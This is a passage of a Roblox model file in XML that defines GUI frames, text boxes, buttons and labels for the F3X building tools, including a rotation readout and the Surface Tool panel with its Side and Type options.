												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX7DF7EB81A2C740899D2CF63E094DF045">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBXC9ED187189D94301B993D77E146A382F">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX437BBFEAB4A14A5BBD47E660D6032BBA">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Z</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>164</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX78C85FE2687E483881F4693368470422">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX8AB553F2ABC94721891D4A57EAF0E80B">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBXB5C499A9C2E54CD7920072560E8C8B54">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXB8081B7E3EDC4DCAA67C9276163F7B14">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Changes</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXA228B53582414D8493F0A369B6F9A2E4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4283144011</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX29311C2B5CB64FB3B7728C444BCC9CFA">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">rotated 0 degrees</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX3E775EBBD4BC463889239B70E94262E1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">EdgeSelectionTip</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Press T for edge selection.</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX22E93BE559184822BB0C33663CB46097">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTSurfaceToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>245</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXD566DE226A2D4551835635BBF9BDAE7E">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX33A888DFF16E4C16999B18F571709C17">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXDF380758E7BA4797B6504870353C38F9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">SURFACE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXBFE8EE1C045141B3AEB89B5F34469BD1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX8CD503D49C2C4104B70E31D6600BEA6A">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">SideOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>120</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXF391259300C944289CF771457EA27079">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Side</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX4F7CF8FA580549D8B855C8DA471AB8D6">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">TypeOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>124</XO>
										<YS>0</YS>
										<YO>30</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>120</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX5522B806AC5749E5BEA6BCDFEDF2BA22">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>40</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Type</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXF4641F2561E040329C9A0F2E234892F4">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Tip</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>70</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX2AAD194CD2334560BCF1537A497A55F9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
